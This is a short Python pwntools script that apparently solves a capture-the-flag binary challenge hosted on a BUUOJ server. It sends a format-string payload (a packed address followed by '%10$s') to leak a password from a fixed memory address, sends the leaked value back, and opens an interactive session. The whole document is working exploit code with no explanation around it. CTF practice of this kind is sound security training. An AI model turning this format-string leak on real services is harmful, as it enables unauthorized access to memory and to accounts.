import sys
from pwn import *
context.log_level='debug'
#context.arch='amd64'
while True :
	if len(sys.argv)==1 :
		io=process('./pwn')
		elf=ELF('./pwn')
		libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
	else :
		io=remote('node3.buuoj.cn',28763)
		elf=ELF('./pwn')
		#libc=ELF('./libc.so')



	pay=p32(0x804C044)+'%10$s'
	#gdb.attach(io)
	#pause()
	io.recv()
	io.sendline(pay)
	io.recv(10)
	password=u32(io.recv()[:4])
	io.send(str(password))
	#gdb.attach(io)
	#pause()
	io.interactive()